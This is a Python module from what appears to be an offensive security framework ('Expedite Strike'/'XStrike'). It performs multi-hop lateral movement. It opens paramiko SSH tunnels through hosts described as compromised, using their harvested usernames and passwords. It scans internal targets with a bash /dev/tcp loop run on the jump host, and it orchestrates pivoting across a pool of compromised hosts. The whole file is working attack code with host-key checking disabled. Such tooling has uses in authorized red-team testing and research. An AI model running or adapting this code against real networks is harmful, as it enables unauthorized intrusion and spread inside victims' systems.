"""
Expedite Strike Lateral Movement Engine
================================
Multi-hop pivoting through compromised hosts via SSH tunnels.

MITRE ATT&CK: T1021 (Remote Services), T1572 (Protocol Tunneling)
"""

import os
import socket
import threading
import time
from typing import Callable

_log_fn = None
def _log(msg):
    if _log_fn:
        _log_fn(msg)


def create_ssh_tunnel(jump_ip: str, jump_user: str, jump_pass: str,
                      target_ip: str, target_port: int,
                      local_port: int = 0, log_fn: Callable = None) -> dict:
    """Create SSH tunnel through a compromised host."""
    global _log_fn
    _log_fn = log_fn

    result = {"success": False, "local_port": 0, "tunnel": None}

    try:
        import paramiko

        # Connect to jump host
        jump = paramiko.SSHClient()
        jump.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        jump.connect(jump_ip, username=jump_user, password=jump_pass,
                     timeout=10, allow_agent=False, look_for_keys=False)

        # Create tunnel
        transport = jump.get_transport()
        if not local_port:
            local_port = _find_free_port()

        channel = transport.open_channel(
            "direct-tcpip",
            (target_ip, target_port),
            ("127.0.0.1", local_port),
        )

        result["success"] = True
        result["local_port"] = local_port
        result["tunnel"] = {"jump": jump, "channel": channel}

        _log(f"  [LATERAL] \u2705 Tunnel: localhost:{local_port} \u2192 {jump_ip} \u2192 {target_ip}:{target_port}")

    except ImportError:
        _log("  [LATERAL] paramiko not installed")
    except Exception as e:
        _log(f"  [LATERAL] Tunnel error: {e}")

    _log_fn = None
    return result


def _find_free_port() -> int:
    """Find a free local port."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        return s.getsockname()[1]


def pivot_scan(jump_ip: str, jump_user: str, jump_pass: str,
               target_ip: str, ports: list = None,
               log_fn: Callable = None) -> list:
    """Scan through a compromised host pivot."""
    global _log_fn
    _log_fn = log_fn

    open_ports = []
    ports = ports or [22, 80, 443, 445, 3389, 8080, 8443]

    _log(f"  [LATERAL] Pivot scan: {jump_ip} \u2192 {target_ip} ({len(ports)} ports)")

    try:
        import paramiko
        jump = paramiko.SSHClient()
        jump.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        jump.connect(jump_ip, username=jump_user, password=jump_pass,
                     timeout=10, allow_agent=False, look_for_keys=False)

        # Use the jump host to run nmap or netcat scan
        port_str = ",".join(str(p) for p in ports)
        cmd = f"for p in {' '.join(str(p) for p in ports)}; do (echo >/dev/tcp/{target_ip}/$p) 2>/dev/null && echo $p; done"
        stdin, stdout, stderr = jump.exec_command(cmd, timeout=30)
        output = stdout.read().decode("utf-8", errors="ignore")

        for line in output.strip().split("\n"):
            try:
                port = int(line.strip())
                open_ports.append(port)
            except ValueError:
                pass

        jump.close()
        _log(f"  [LATERAL] Pivot scan found {len(open_ports)} open ports on {target_ip}")

    except Exception as e:
        _log(f"  [LATERAL] Pivot scan error: {e}")

    _log_fn = None
    return open_ports


def run_lateral_movement(compromised_hosts: list, all_hosts: list,
                         cred_pool=None, log_fn: Callable = None) -> dict:
    """Orchestrate lateral movement from compromised hosts."""
    global _log_fn
    _log_fn = log_fn

    result = {
        "new_hosts": [],
        "lateral_paths": [],
        "findings": [],
    }

    compromised_ips = {h.get("ip", "") for h in compromised_hosts}
    target_ips = {h.get("ip", "") for h in all_hosts} - compromised_ips

    if not compromised_hosts or not target_ips:
        _log("  [LATERAL] No pivot targets available")
        _log_fn = None
        return result

    _log(f"  [LATERAL] \ud83d\udd78\ufe0f Lateral movement: {len(compromised_hosts)} pivots \u2192 {len(target_ips)} targets")

    for pivot in compromised_hosts[:3]:
        pip = pivot.get("ip", "")
        puser = pivot.get("username", "")
        ppass = pivot.get("password", "")

        if not pip or not puser or not ppass:
            continue

        for tip in list(target_ips)[:5]:
            open_ports = pivot_scan(pip, puser, ppass, tip, log_fn=log_fn)
            if open_ports:
                result["new_hosts"].append({"ip": tip, "ports": open_ports, "via": pip})
                result["lateral_paths"].append({
                    "source": pip, "target": tip,
                    "method": "ssh_pivot", "ports_found": open_ports,
                })
                result["findings"].append({
                    "scanner": "XStrike-Lateral", "host": tip,
                    "port": open_ports[0] if open_ports else 0,
                    "title": f"Internal host reachable via pivot through {pip}",
                    "severity": "High",
                    "description": f"Host {tip} accessible through pivot from {pip}. Ports: {open_ports}",
                    "cve": "", "mitre_id": "T1021",
                })

    _log(f"  [LATERAL] Found {len(result['new_hosts'])} new reachable hosts via pivoting")
    _log_fn = None
    return result
